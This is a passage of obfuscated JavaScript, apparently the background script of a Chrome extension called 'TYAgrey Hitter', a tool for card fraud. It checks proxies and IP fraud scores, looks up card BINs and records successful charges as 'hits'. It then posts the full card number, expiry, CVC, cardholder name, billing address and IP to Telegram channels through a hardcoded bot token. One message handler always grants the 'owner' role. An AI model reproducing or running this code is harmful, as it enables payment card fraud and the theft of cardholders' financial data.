      body: JSON.stringify({
        token: _0x3441ec
      }),
      signal: _0x9937ba.signal
    });
    clearTimeout(_0x5abc71);
    const _0xca114a = await _0x3bfb24.text();
    let _0x36c52e;
    try {
      _0x36c52e = JSON.parse(_0xca114a);
    } catch (_0x4a9fac) {
      return {
        success: false,
        error: "Invalid server response"
      };
    }
    if (_0x3bfb24.ok && _0x36c52e.success) {
      return {
        success: true,
        user_id: _0x36c52e.user_id || "",
        chat_id: _0x36c52e.chat_id || "",
        username: _0x36c52e.username || _0x36c52e.telegram_username || "",
        telegram_username: _0x36c52e.telegram_username || "",
        first_name: _0x36c52e.first_name || "",
        last_name: _0x36c52e.last_name || "",
        role: _0x36c52e.role || "user",
        pfp_url: _0x36c52e.pfp_url || "",
        hits: _0x36c52e.hits || 0,
        attempts: _0x36c52e.attempts || 0,
        global_hits: _0x36c52e.global_hits || 0
      };
    }
    if (_0x3bfb24.status === 401) {
      return {
        success: false,
        error: "Invalid Token"
      };
    }
    if (_0x3bfb24.status === 403) {
      return {
        success: false,
        error: _0x36c52e.error || "Account suspended"
      };
    }
    if (_0x3bfb24.status === 400) {
      return {
        success: false,
        error: _0x36c52e.error || "Bad request"
      };
    }
    return {
      success: false,
      error: _0x36c52e.error || "Server error. Try again"
    };
  } catch (_0x5cf26b) {
    if (_0x5cf26b.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
    }
    return {
      success: false,
      error: "Connection failed"
    };
  }
}
async function checkProxyLive(_0xa7b3b1) {
  async function _0x7de014(_0x7ab0cb, _0x41f61a) {
    const _0x91a189 = await fetch(_0x7ab0cb, _0x41f61a);
    if (!_0x91a189.ok) {
      return {
        success: false,
        status: "fail",
        error: "HTTP " + _0x91a189.status
      };
    }
    const _0x3c6213 = await _0x91a189.text();
    try {
      return JSON.parse(_0x3c6213);
    } catch (_0x251210) {
      return {
        success: false,
        status: "fail",
        error: "Invalid response from proxy checker"
      };
    }
  }
  function _0x120415(_0x36ce95, _0x55d56f, _0x134c32) {
    return new Promise((_0x48e43e, _0x27a025) => {
      const _0x3602c0 = new XMLHttpRequest();
      _0x3602c0.open(_0x55d56f, _0x36ce95, true);
      _0x3602c0.timeout = 10000;
      _0x3602c0.setRequestHeader("Accept", "application/json");
      if (_0x134c32) {
        _0x3602c0.setRequestHeader("Content-Type", "application/json");
      }
      _0x3602c0.onload = function () {
        if (_0x3602c0.status >= 200 && _0x3602c0.status < 300) {
          try {
            _0x48e43e(JSON.parse(_0x3602c0.responseText));
          } catch (_0x1b064f) {
            _0x48e43e({
              success: false,
              status: "fail",
              error: "Invalid response from proxy checker"
            });
          }
        } else {
          _0x48e43e({
            success: false,
            status: "fail",
            error: "HTTP " + _0x3602c0.status
          });
        }
      };
      _0x3602c0.onerror = function () {
        _0x27a025(new Error("XHR request failed"));
      };
      _0x3602c0.ontimeout = function () {
        _0x27a025(new Error("XHR timeout"));
      };
      _0x3602c0.send(_0x134c32 ? JSON.stringify(_0x134c32) : null);
    });
  }
  const _0x1dd8ed = new AbortController();
  const _0x11a254 = setTimeout(() => _0x1dd8ed.abort(), 10000);
  const _0x4b103e = {
    signal: _0x1dd8ed.signal,
    mode: "cors",
    cache: "no-store",
    redirect: "follow",
    headers: {
      Accept: "application/json"
    }
  };
  try {
    const _0x17a70d = PROXY_CHECK_URL + "?proxy=" + encodeURIComponent(_0xa7b3b1);
    return await _0x7de014(_0x17a70d, {
      ..._0x4b103e,
      method: "GET"
    });
  } catch (_0x5f360f) {
    if (_0x5f360f.name === "AbortError") {
      return {
        success: false,
        status: "fail",
        error: "Proxy check timeout (server slow)"
      };
    }
    try {
      const _0x2b9417 = {
        ..._0x4b103e,
        method: "POST",
        headers: {
          ..._0x4b103e.headers,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          proxy: _0xa7b3b1
        })
      };
      return await _0x7de014(PROXY_CHECK_URL, _0x2b9417);
    } catch (_0x1e6070) {
      if (_0x1e6070.name === "AbortError") {
        return {
          success: false,
          status: "fail",
          error: "Proxy check timeout (server slow)"
        };
      }
      try {
        const _0x5070a0 = await _0x120415(PROXY_CHECK_URL, "POST", {
          proxy: _0xa7b3b1
        });
        return _0x5070a0;
      } catch (_0x13e750) {
        const _0x18675f = _0x13e750 && _0x13e750.message ? _0x13e750.message : "Failed to fetch proxy checker";
        return {
          success: false,
          status: "fail",
          error: "Fallback XHR failed: " + _0x18675f
        };
      }
    }
  } finally {
    clearTimeout(_0x11a254);
  }
}
async function fetchRealIp() {
  try {
    const _0xa78c30 = new AbortController();
    const _0xa0eb39 = setTimeout(() => _0xa78c30.abort(), 10000);
    const _0x16bfa2 = ["https://api.ipify.org?format=json", "https://api.ip.sb/ip", "https://api64.ipify.org?format=json"];
    for (const _0x9d3038 of _0x16bfa2) {
      try {
        const _0x8043c6 = await fetch(_0x9d3038, {
          signal: _0xa78c30.signal,
          headers: {
            Accept: "application/json, text/plain"
          }
        });
        if (_0x8043c6.ok) {
          const _0x5acced = await _0x8043c6.text();
          clearTimeout(_0xa0eb39);
          try {
            const _0x4905a5 = JSON.parse(_0x5acced);
            if (_0x4905a5.ip) {
              return {
                success: true,
                ip: _0x4905a5.ip
              };
            }
          } catch (_0x438066) {
            const _0x30dfc8 = _0x5acced.trim();
            if (_0x30dfc8 && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(_0x30dfc8)) {
              return {
                success: true,
                ip: _0x30dfc8
              };
            }
          }
        }
      } catch (_0x324858) {
        continue;
      }
    }
    clearTimeout(_0xa0eb39);
    return {
      success: false,
      error: "Could not fetch IP"
    };
  } catch (_0x96a308) {
    return {
      success: false,
      error: _0x96a308.message
    };
  }
}
function clampFraudScore(_0x28596f) {
  _0x28596f = parseInt(_0x28596f, 10);
  if (isNaN(_0x28596f)) {
    _0x28596f = 0;
  }
  if (_0x28596f < 0) {
    return 0;
  }
  if (_0x28596f > 100) {
    return 100;
  }
  return _0x28596f;
}
function parseAbuserScore(_0x1a1662) {
  if (typeof _0x1a1662 === "number") {
    return _0x1a1662;
  }
  if (!_0x1a1662) {
    return 0;
  }
  const _0x5cb399 = String(_0x1a1662).match(/([0-9]+(?:\.[0-9]+)?)/);
  if (_0x5cb399) {
    return parseFloat(_0x5cb399[1]);
  } else {
    return 0;
  }
}
function buildFraudRisk(_0xa5c9d2) {
  _0xa5c9d2 = clampFraudScore(_0xa5c9d2);
  if (_0xa5c9d2 >= 75) {
    return "VERY HIGH";
  }
  if (_0xa5c9d2 >= 50) {
    return "HIGH";
  }
  if (_0xa5c9d2 >= 25) {
    return "MEDIUM";
  }
  return "LOW";
}
function scoreFromIpApi(_0x20dec6) {
  let _0x38e0c2 = 5;
  if (!_0x20dec6) {
    return _0x38e0c2;
  }
  if (_0x20dec6.is_mobile) {
    _0x38e0c2 -= 3;
  }
  if (_0x20dec6.is_crawler) {
    _0x38e0c2 += 20;
  }
  if (_0x20dec6.is_datacenter) {
    _0x38e0c2 += 25;
  }
  if (_0x20dec6.is_vpn) {
    _0x38e0c2 += 35;
  }
  if (_0x20dec6.is_proxy) {
    _0x38e0c2 += 40;
  }
  if (_0x20dec6.is_tor) {
    _0x38e0c2 += 50;
  }
  if (_0x20dec6.is_abuser) {
    _0x38e0c2 += 45;
  }
  _0x38e0c2 += Math.min(12, Math.round(parseAbuserScore(_0x20dec6.company && _0x20dec6.company.abuser_score) * 2000));
  _0x38e0c2 += Math.min(8, Math.round(parseAbuserScore(_0x20dec6.asn && _0x20dec6.asn.abuser_score) * 1500));
  return clampFraudScore(_0x38e0c2);
}
async function getIpFraudCheck(_0x2fe94f, _0x138957) {
  async function _0x5af2a8(_0x223a11) {
    const _0x57937d = new AbortController();
    const _0x51d2ba = setTimeout(() => _0x57937d.abort(), 15000);
    const _0x5bba04 = new URLSearchParams({
      strictness: "1",
      allow_public_access_points: "true",
      lighter_penalties: "false",
      mobile: "true"
    });
    const _0x2a2978 = "https://www.ipqualityscore.com/api/json/ip/" + encodeURIComponent(_0x223a11) + "/" + encodeURIComponent(_0x2fe94f) + "?" + _0x5bba04.toString();
    const _0x86bdb0 = await fetch(_0x2a2978, {
      method: "GET",
      headers: {
        Accept: "application/json"
      },
      signal: _0x57937d.signal
    });
    clearTimeout(_0x51d2ba);
    if (!_0x86bdb0.ok) {
      return {
        success: false,
        error: "IPQS failed (" + _0x86bdb0.status + ")"
      };
    }
    const _0x2afd0b = await _0x86bdb0.json();
    if (_0x2afd0b.success === false) {
      return {
        success: false,
        error: _0x2afd0b.message || _0x2afd0b.error || "IPQS returned an error"
      };
    }
    const _0x215a86 = clampFraudScore(_0x2afd0b.fraud_score ?? _0x2afd0b.risk_score ?? 0);
    return {
      success: true,
      ip: _0x2afd0b.ip_address || _0x2fe94f,
      score: _0x215a86,
      risk: String(buildFraudRisk(_0x215a86)).toUpperCase(),
      country: _0x2afd0b.country_code || _0x2afd0b.country || "N/A",
      country_code: _0x2afd0b.country_code || "",
      state: _0x2afd0b.region || "N/A",
      city: _0x2afd0b.city || "N/A",
      isp: _0x2afd0b.ISP || _0x2afd0b.organization || "N/A",
      source: "ipqualityscore",
      notes: [_0x2afd0b.proxy ? "Proxy" : null, _0x2afd0b.vpn ? "VPN" : null, _0x2afd0b.tor ? "Tor" : null, _0x2afd0b.active_vpn ? "Active VPN" : null, _0x2afd0b.active_tor ? "Active Tor" : null, _0x2afd0b.recent_abuse ? "Recent Abuse" : null, _0x2afd0b.bot_status ? "Bot" : null].filter(Boolean).join(", ") || "Connection: " + (_0x2afd0b.connection_type || "Unknown"),
      is_proxy: !!_0x2afd0b.proxy,
      is_vpn: !!_0x2afd0b.vpn || !!_0x2afd0b.active_vpn,
      is_tor: !!_0x2afd0b.tor || !!_0x2afd0b.active_tor,
      is_datacenter: _0x2afd0b.connection_type === "Data Center" || _0x2afd0b.connection_type === "Hosting Provider",
      is_abuser: !!_0x2afd0b.recent_abuse
    };
  }
  async function _0xe70358(_0x161a61, _0x110dd7) {
    const _0x3ee804 = new AbortController();
    const _0x5c4752 = setTimeout(() => _0x3ee804.abort(), 15000);
    const _0x2a65bd = await fetch(_0x161a61, {
      method: "GET",
      headers: {
        Accept: "application/json"
      },
      signal: _0x3ee804.signal
    });
    clearTimeout(_0x5c4752);
    if (!_0x2a65bd.ok) {
      return {
        success: false,
        error: "Fraud check failed (" + _0x2a65bd.status + ")"
      };
    }
    const _0x57a751 = await _0x2a65bd.json();
    if (_0x57a751.status !== "ok" || !_0x57a751[_0x2fe94f]) {
      return {
        success: false,
        error: _0x57a751.message || "ProxyCheck returned no result"
      };
    }
    const _0x48f46a = _0x57a751[_0x2fe94f] || {};
    const _0x19a90c = _0x48f46a.detections || _0x48f46a;
    const _0x3978a2 = _0x48f46a.network || _0x48f46a;
    const _0x47b4bf = _0x48f46a.location || _0x48f46a;
    const _0x26a08e = _0x19a90c.risk ?? 0;
    const _0x4ecd9d = clampFraudScore(_0x26a08e);
    return {
      success: true,
      ip: _0x2fe94f,
      score: _0x4ecd9d,
      risk: String(buildFraudRisk(_0x4ecd9d)).toUpperCase(),
      country: _0x47b4bf.country_name || _0x47b4bf.country || "N/A",
      country_code: _0x47b4bf.country_code || _0x47b4bf.isocode || "",
      state: _0x47b4bf.region_name || _0x47b4bf.region || "N/A",
      city: _0x47b4bf.city_name || _0x47b4bf.city || "N/A",
      isp: _0x3978a2.provider || _0x3978a2.organisation || "N/A",
      source: _0x110dd7,
      notes: _0x19a90c.proxy || _0x19a90c.vpn || _0x19a90c.tor || _0x19a90c.hosting || _0x19a90c.compromised ? [_0x19a90c.proxy ? "Proxy" : null, _0x19a90c.vpn ? "VPN" : null, _0x19a90c.tor ? "Tor" : null, _0x19a90c.hosting ? "Hosting" : null, _0x19a90c.compromised ? "Compromised" : null].filter(Boolean).join(", ") : "Confidence " + (_0x19a90c.confidence ?? "N/A") + "%",
      is_proxy: !!_0x19a90c.proxy,
      is_vpn: !!_0x19a90c.vpn,
      is_tor: !!_0x19a90c.tor,
      is_datacenter: !!_0x19a90c.hosting,
      is_abuser: !!_0x19a90c.compromised
    };
  }
  function _0x1305c5(_0x429964) {
    if (!_0x429964 || !_0x429964.success) {
      return false;
    }
    return [_0x429964.country, _0x429964.state, _0x429964.city, _0x429964.isp].some(_0x155aa8 => _0x155aa8 && _0x155aa8 !== "N/A");
  }
  try {
    if (!_0x2fe94f) {
      return {
        success: false,
        error: "Missing IP address"
      };
    }
    const _0xfa0685 = _0x138957 || "";
    if (_0xfa0685) {
      const _0xfbc364 = await _0x5af2a8(_0xfa0685);
      if (_0x1305c5(_0xfbc364)) {
        return _0xfbc364;
      }
    }
    const _0x1572f2 = "https://proxycheck.io/v3/" + encodeURIComponent(_0x2fe94f) + "?vpn=1&risk=1&asn=1&days=7";
    const _0x2192a9 = await _0xe70358(_0x1572f2, "proxycheck.io fallback");
    if (_0x1305c5(_0x2192a9)) {
      return _0x2192a9;
    }
    return {
      success: false,
      error: "ProxyCheck returned empty details"
    };
  } catch (_0x2b8201) {
    if (_0x2b8201.name === "AbortError") {
      return {
        success: false,
        error: "Fraud check timeout"
      };
    }
    return {
      success: false,
      error: _0x2b8201.message
    };
  }
}
async function sendTelegramNotification(_0x3796ae) {
  try {
    console.log("[TYAgrey][Telegram] sendTelegramNotification called with data:", _0x3796ae);
    if (!_0x3796ae) {
      console.warn("[TYAgrey][Telegram] Notification skipped - no data provided");
      return;
    }
    const _0xdf4cda = _0x3796ae.attempt || 1;
    const _0x4a288d = _0x453944 => String(_0x453944 ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    const _0x1badd8 = _0x3796ae.cardNumber || "N/A";
    const _0x3fc15c = _0x1badd8 !== "N/A" ? String(_0x1badd8).replace(/\D/g, "").slice(0, 8) : _0x3796ae.bin || "N/A";
    const _0x3ef35f = _0x3796ae.businessName || _0x3796ae.merchant || _0x3796ae.site || "N/A";
    const _0x42b7a6 = _0x3796ae.businessUrl || _0x3796ae.successUrl || _0x3796ae.siteUrl || "N/A";
    let _0x59d4ec = _0x3ef35f;
    if (_0x59d4ec === "N/A" && _0x42b7a6 !== "N/A") {
      try {
        _0x59d4ec = new URL(_0x42b7a6).hostname;
      } catch (_0x596d58) {
        _0x59d4ec = "N/A";
      }
    }
    const _0x254fc9 = _0x3796ae.amount || "0";
    const _0x3c3e81 = (_0x3796ae.currency || "usd").toUpperCase();
    const _0x5c436 = _0x3796ae.userName || _0x3796ae.firstName || "Unknown";
    const _0x2bcc8b = _0x3796ae.userId || "N/A";
    const _0x29c3ea = _0x3796ae.timeTaken || "N/A";
    const _0x38a3df = new Date().toLocaleString("en-US", {
      hour12: false
    });
    const _0x465d14 = "8673386254:AAH6-BuogsPpCrdc8SymaqRpnfxF706BfXQ";
    const _0x402076 = "7715922791";
    const _0x71c2cf = "@TYAgreyHitterBrotherhood";
    const _0x4e06d5 = "@tyagreyprivatefullcc";
    const _0x976080 = _0x3796ae.userChatId || null;
    const _0xfda222 = _0x3796ae.userRole || "user";
    let _0x311574 = "TYAgrey Hitter v1.1";
    let _0x4d95ec = "";
    if (_0xfda222 === "user") {
      _0x311574 = "TYAgrey Hitter v1.1 Free";
      _0x4d95ec = " Free";
    } else if (_0xfda222 === "pro") {
      _0x311574 = "TYAgrey Hitter v1.1 Pro";
      _0x4d95ec = " Pro";
    } else if (_0xfda222 === "pro_plus" || _0xfda222 === "admin" || _0xfda222 === "owner") {
      _0x311574 = "TYAgrey Hitter v1.1 Pro+";
      _0x4d95ec = " Pro+";
    }
    const _0x459b92 = "<b>🎉 HIT FOUND!\n────────────────────\n👛 " + _0x311574 + " 🔥\n🎙 User: " + _0x4a288d(_0x5c436) + "\n🪙 Amount: " + _0x4a288d(_0x254fc9) + " " + _0x4a288d(_0x3c3e81) + "\n🔥 SuccessUrl: " + _0x4a288d(_0x42b7a6) + "\n❤️ Attempt: " + _0x4a288d(_0xdf4cda) + "\n────────────────────\n💳 CARD DETAILS:\n" + _0x4a288d(_0x1badd8) + "\nCHARGED 💵\n\n🎉 BIN: " + _0x4a288d(_0x3fc15c) + "\n────────────────────\n✨ Thanks for using " + _0x311574 + ".\n⏰Hit Time: " + _0x4a288d(_0x38a3df) + "</b>";
    const _0x3c9dcf = "<b>🎉 HIT FOUND! | " + _0x311574 + " 🔥\n────────────────────\n🔥 " + _0x311574 + "\n🎙 User: " + _0x4a288d(_0x5c436) + "\n☄️ Amount: " + _0x4a288d(_0x254fc9) + " " + _0x4a288d(_0x3c3e81) + "\n↗️ Attempt: " + _0x4a288d(_0xdf4cda) + "</b>";
    const _0x4e88dd = _0x1badd8 !== "N/A" ? String(_0x1badd8).split("|") : [];
    const _0x2a0355 = _0x4e88dd[1] || _0x3796ae.exp_month || "N/A";
    const _0x2a3b00 = _0x4e88dd[2] || _0x3796ae.exp_year || "N/A";
    const _0x59e01a = _0x4e88dd[3] || _0x3796ae.cvc || "N/A";
    const _0x38d105 = async _0x2ee1ce => {
      try {
        console.log("[TYAgrey][Telegram] sending full notification to", _0x2ee1ce);
        const _0x9f050b = {
          inline_keyboard: [[{
            text: "📋 Copy Card",
            callback_data: "copy_card_" + _0x4a288d(_0x1badd8)
          }], [{
            text: "📋 Copy BIN",
            callback_data: "copy_bin_" + _0x4a288d(_0x3fc15c)
          }]]
        };
        const _0x134f2b = await fetch("https://api.telegram.org/bot" + _0x465d14 + "/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: _0x2ee1ce,
            parse_mode: "HTML",
            text: _0x459b92,
            disable_web_page_preview: true,
            reply_markup: JSON.stringify(_0x9f050b)
          })
        });
        if (!_0x134f2b.ok) {
          const _0x1bc0a7 = await _0x134f2b.text().catch(() => "");
          console.warn("[TYAgrey][Telegram] sendMessage failed", _0x2ee1ce, _0x134f2b.status, _0x1bc0a7);
        } else {
          console.log("[TYAgrey][Telegram] sendMessage succeeded", _0x2ee1ce);
        }
      } catch (_0x13595a) {
        console.warn("[TYAgrey][Telegram] request error", _0x13595a && _0x13595a.message ? _0x13595a.message : _0x13595a);
      }
    };
    const _0x11b9ca = async _0x3ca633 => {
      try {
        console.log("[TYAgrey][Telegram] sending channel notification to", _0x3ca633);
        const _0x5dd6eb = await fetch("https://api.telegram.org/bot" + _0x465d14 + "/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: _0x3ca633,
            parse_mode: "HTML",
            text: _0x3c9dcf,
            disable_web_page_preview: true
          })
        });
        if (!_0x5dd6eb.ok) {
          const _0x5a4a3a = await _0x5dd6eb.text().catch(() => "");
          console.warn("[TYAgrey][Telegram] sendChannelMessage failed", _0x3ca633, _0x5dd6eb.status, _0x5a4a3a);
        } else {
          console.log("[TYAgrey][Telegram] sendChannelMessage succeeded", _0x3ca633);
        }
      } catch (_0x5f1e44) {
        console.warn("[TYAgrey][Telegram] channel request error", _0x5f1e44 && _0x5f1e44.message ? _0x5f1e44.message : _0x5f1e44);
      }
    };
    await _0x38d105(_0x402076);
    if (_0x3796ae.tgForwardEnabled === true && _0x976080) {
      await _0x38d105(_0x976080);
    }
    await _0x11b9ca(_0x71c2cf);
    try {
      console.log("[TYAgrey][Telegram] sending full-cc detailed notification to", _0x4e06d5);
      const _0x39e2f6 = ["💳 CARD: " + (_0x1badd8 || "N/A"), "", "Month: " + (_0x2a0355 || "N/A"), "", "Year: " + (_0x2a3b00 || "N/A"), "", "CVC: " + (_0x59e01a || "N/A"), "", "Email: " + (_0x3796ae.email || "N/A"), "", "Full Name: " + (_0x3796ae.full_name || "N/A"), "", "Billing Address: " + (_0x3796ae.billing_address || "N/A"), "", "Billing City: " + (_0x3796ae.billing_city || "N/A"), "", "Billing State: " + (_0x3796ae.billing_state || "N/A"), "", "Billing ZIP: " + (_0x3796ae.billing_zip || "N/A"), "", "Billing Country: " + (_0x3796ae.billing_country || "N/A"), "", "IP: " + (_0x3796ae.ip || "N/A"), "", "Merchant Website: " + (_0x3796ae.businessUrl || _0x3796ae.merchant_website || _0x42b7a6 || "N/A"), "", "✅ CHARGED - Payment Successful", "💰 " + (_0x254fc9 || "0.00") + " " + (_0x3c3e81 || "USD")];
      const _0x2ac0d5 = _0x39e2f6.join("\n");
      const _0x56dbea = await fetch("https://api.telegram.org/bot" + _0x465d14 + "/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: _0x4e06d5,
          text: _0x2ac0d5,
          disable_web_page_preview: true
        })
      });
      if (!_0x56dbea.ok) {
        const _0x195ea3 = await _0x56dbea.text().catch(() => "");
        console.warn("[TYAgrey][Telegram] fullCc send failed", _0x4e06d5, _0x56dbea.status, _0x195ea3);
      } else {
        console.log("[TYAgrey][Telegram] fullCc send succeeded", _0x4e06d5);
      }
    } catch (_0x355fe6) {
      console.warn("[TYAgrey][Telegram] fullCc request error", _0x355fe6 && _0x355fe6.message ? _0x355fe6.message : _0x355fe6);
    }
  } catch (_0x467ef3) {
    console.warn("[TYAgrey][Telegram] unexpected error", _0x467ef3 && _0x467ef3.message ? _0x467ef3.message : _0x467ef3);
  }
}
async function getBinInfo(_0x1680df) {
  try {
    console.log("[TYAgrey][BIN] Looking up BIN:", _0x1680df);
    const _0x17eff3 = [{
      url: "https://lookup.binlist.net/" + _0x1680df,
      parser: _0x52f40d => ({
        scheme: _0x52f40d.scheme,
        type: _0x52f40d.type,
        brand: _0x52f40d.brand,
        bank: _0x52f40d.bank?.name,
        country: _0x52f40d.country?.name,
        flag: _0x52f40d.country ? getCountryFlag(_0x52f40d.country.alpha2) : ""
      })
    }, {
      url: "https://bin-checker.net/api/" + _0x1680df,
      parser: _0x35c9f5 => ({
        scheme: _0x35c9f5.card_scheme,
        type: _0x35c9f5.card_type,
        brand: _0x35c9f5.card_brand,
        bank: _0x35c9f5.bank_name,
        country: _0x35c9f5.country_name,
        flag: _0x35c9f5.country_code ? getCountryFlag(_0x35c9f5.country_code) : ""
      })
    }];
    for (const _0x7c1558 of _0x17eff3) {
      try {
        const _0x326f93 = await fetch(_0x7c1558.url, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          }
        });
        if (_0x326f93.ok) {
          const _0x4cce1b = await _0x326f93.json();
          const _0x35dfc3 = _0x7c1558.parser(_0x4cce1b);
          console.log("[TYAgrey][BIN] Success:", _0x35dfc3);
          return _0x35dfc3;
        }
      } catch (_0x5bd46f) {
        console.log("[TYAgrey][BIN] API failed:", _0x5bd46f.message);
        continue;
      }
    }
    return getBasicBinInfo(_0x1680df);
  } catch (_0x5b2668) {
    console.warn("[TYAgrey][BIN] Lookup failed:", _0x5b2668);
    return getBasicBinInfo(_0x1680df);
  }
}
function getBasicBinInfo(_0x270062) {
  const _0x47726c = _0x270062.charAt(0);
  if (_0x47726c === "4") {
    return {
      scheme: "VISA",
      type: "DEBIT/CREDIT",
      brand: "CLASSIC",
      bank: "Unknown Bank",
      country: "Unknown",
      flag: ""
    };
  } else if (_0x47726c === "5") {
    return {
      scheme: "MASTERCARD",
      type: "DEBIT/CREDIT",
      brand: "STANDARD",
      bank: "Unknown Bank",
      country: "Unknown",
      flag: ""
    };
  } else if (_0x47726c === "3") {
    return {
      scheme: "AMERICAN EXPRESS",
      type: "CREDIT",
      brand: "PREMIUM",
      bank: "Unknown Bank",
      country: "Unknown",
      flag: ""
    };
  } else if (_0x47726c === "6") {
    return {
      scheme: "DISCOVER",
      type: "CREDIT",
      brand: "DISCOVER",
      bank: "DISCOVER BANK",
      country: "United States",
      flag: "🇺🇸"
    };
  } else {
    return {
      scheme: "Unknown",
      type: "Unknown",
      brand: "Unknown",
      bank: "Unknown Bank",
      country: "Unknown",
      flag: ""
    };
  }
}
function getCountryFlag(_0x482480) {
  const _0x427289 = {
    US: "🇺🇸",
    GB: "🇬🇧",
    CA: "🇨🇦",
    AU: "🇦🇺",
    DE: "🇩🇪",
    FR: "🇫🇷",
    IT: "🇮🇹",
    ES: "🇪🇸",
    NL: "🇳🇱",
    BE: "🇧🇪",
    CH: "🇨🇭",
    AT: "🇦🇹",
    SE: "🇸🇪",
    NO: "🇳🇴",
    DK: "🇩🇰",
    FI: "🇫🇮",
    PL: "🇵🇱",
    CZ: "🇨🇿",
    HU: "🇭🇺",
    RO: "🇷🇴",
    BG: "🇧🇬",
    GR: "🇬🇷",
    PT: "🇵🇹",
    IE: "🇮🇪",
    RU: "🇷🇺",
    UA: "🇺🇦",
    KZ: "🇰🇿",
    CN: "🇨🇳",
    JP: "🇯🇵",
    KR: "🇰🇷",
    IN: "🇮🇳",
    PK: "🇵🇰",
    BD: "🇧🇩",
    LK: "🇱🇰",
    NP: "🇳🇵",
    MM: "🇲🇲",
    TH: "🇹🇭",
    VN: "🇻🇳",
    PH: "🇵🇭",
    MY: "🇲🇾",
    SG: "🇸🇬",
    ID: "🇮🇩",
    BR: "🇧🇷",
    AR: "🇦🇷",
    CL: "🇨🇱",
    PE: "🇵🇪",
    CO: "🇨🇴",
    MX: "🇲🇽",
    ZA: "🇿🇦",
    EG: "🇪🇬",
    NG: "🇳🇬",
    KE: "🇰🇪",
    GH: "🇬🇭",
    TN: "🇹🇳",
    MA: "🇲🇦",
    DZ: "🇩🇿",
    TR: "🇹🇷",
    SA: "🇸🇦",
    AE: "🇦🇪",
    IL: "🇮🇱"
  };
  return _0x427289[_0x482480] || "";
}
chrome.runtime.onMessage.addListener((_0xe8383b, _0x24fd12, _0x3e172a) => {
  if (_0xe8383b.type === "CHECK_LICENSE_KEY") {
    checkLicenseKey(_0xe8383b.key, _0xe8383b.version).then(_0x3e172a).catch(_0x57d1aa => _0x3e172a({
      success: false,
      valid: false,
      error: _0x57d1aa.message
    }));
    return true;
  }
  if (_0xe8383b.type === "VALIDATE_TOKEN") {
    validateToken(_0xe8383b.token).then(_0x3e172a).catch(_0x1def8b => _0x3e172a({
      success: false,
      error: _0x1def8b.message
    }));
    return true;
  }
  if (_0xe8383b.type === "GET_USER_ROLE") {
    _0x3e172a({
      success: true,
      role: "owner"
    });
    return true;
  }
  if (_0xe8383b.type === "CHECK_PROXY_LIVE") {
    checkProxyLive(_0xe8383b.proxy).then(_0x3e172a).catch(_0x23093b => _0x3e172a({
      success: false,
      status: "fail",
      error: _0x23093b.message
    }));
    return true;
  }
  if (_0xe8383b.type === "SET_PROXY") {
    applyProxy(_0xe8383b.proxy, _0xe8383b.info).then(_0x3e172a).catch(_0x36a07c => _0x3e172a({
      success: false,
      error: _0x36a07c.message
    }));
    return true;
  }
  if (_0xe8383b.type === "API_REQUEST") {
    const _0x454f9e = _0xe8383b.endpoint;
    const _0x40a2bd = _0xe8383b.payload || {};
    const _0x555b26 = new Set(["record-hit", "save-hit-to-history", "get-my-hits", "get-user-history", "get-user-data", "check-daily-hit-limit", "record-attempt", "sync-my-hits"]);
    if (_0x555b26.has(_0x454f9e)) {
      const _0x43a7aa = _0x40a2bd.token ? String(_0x40a2bd.token) : "";
      if (_0x43a7aa) {
        _0x40a2bd.token = _0x43a7aa;
        _0x55ff18(_0x454f9e, _0x40a2bd, _0x3e172a);
        return true;
      }
      chrome.storage.local.get(["tyagrey_token"], _0x83429e => {
        const _0x390a60 = _0x83429e && _0x83429e.tyagrey_token ? String(_0x83429e.tyagrey_token) : "";
        if (!_0x390a60) {
          _0x3e172a({
            success: false,
            error: "Not logged in"
          });
          return;
        }
        _0x40a2bd.token = _0x390a60;
        _0x55ff18(_0x454f9e, _0x40a2bd, _0x3e172a);
      });
      return true;
    }
    async function _0x55ff18(_0x5aea91, _0x35cd4b, _0x5af44a) {
      try {
        const _0x19e8aa = _0x35cd4b.token || "";
        if (_0x5aea91 === "record-hit" || _0x5aea91 === "save-hit-to-history") {
          const _0x50e5a3 = await handleAPIRequest(_0x5aea91, _0x35cd4b);
          if (_0x50e5a3 && _0x50e5a3.success) {
            _0x5af44a(_0x50e5a3);
            return;
          }
          const _0x372a69 = {
            token: _0x19e8aa,
            full_card: _0x35cd4b.full_card || _0x35cd4b.card_info || "",
            amount: _0x35cd4b.amount || "0",
            currency: _0x35cd4b.currency || "usd",
            merchant: _0x35cd4b.merchant || _0x35cd4b.site || "N/A"
          };
          const _0x2a85f0 = await handleAPIRequest("hit", _0x372a69);
          if (_0x2a85f0 && _0x2a85f0.success) {
            _0x5af44a({
              success: true,
              message: "Saved via legacy endpoint",
              fallback_endpoint: "hit",
              data: _0x2a85f0
            });
            return;
          }
          _0x5af44a(_0x50e5a3 || _0x2a85f0 || {
            success: false,
            error: "Failed to save hit"
          });
          return;
        }
        if (_0x5aea91 === "get-my-hits") {
          const _0x15b049 = await handleAPIRequest("get-my-hits", _0x35cd4b);
          const _0x4188c7 = _0x15b049 && Array.isArray(_0x15b049.hits) ? _0x15b049.hits : [];
          if (_0x15b049 && _0x15b049.success && _0x4188c7.length > 0) {
            await syncCloudHitsToLocal(_0x19e8aa, 100);
            _0x5af44a(_0x15b049);
            return;
          }
          const _0x27b341 = await handleAPIRequest("get-user-history", {
            token: _0x19e8aa,
            status: "success",
            limit: 100,
            _method: "GET"
          });
          if (_0x27b341 && _0x27b341.success) {
            await syncCloudHitsToLocal(_0x19e8aa, 100);
            _0x5af44a({
              success: true,
              hits: Array.isArray(_0x27b341.history) ? _0x27b341.history : [],
              source: "get-user-history"
            });
            return;
          }
          _0x5af44a(_0x15b049 || _0x27b341 || {
            success: false,
            error: "Failed to load hits"
          });
          return;
        }
        if (_0x5aea91 === "sync-my-hits") {
          const _0x234423 = await syncCloudHitsToLocal(_0x19e8aa, 100);
          _0x5af44a(_0x234423);
          return;
        }
